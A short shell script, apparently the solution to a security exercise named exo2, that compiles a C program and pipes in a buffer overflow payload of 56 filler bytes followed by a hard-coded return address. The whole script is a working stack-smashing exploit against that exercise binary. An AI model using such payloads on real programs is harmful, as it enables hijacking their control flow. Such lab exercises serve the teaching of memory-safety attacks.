#!/bin/sh

gcc exo2.c
python3 -c 'print("A"*56 + "\x62\x11\x40\x00\x00\x00\x00\x00")' | ./a.out
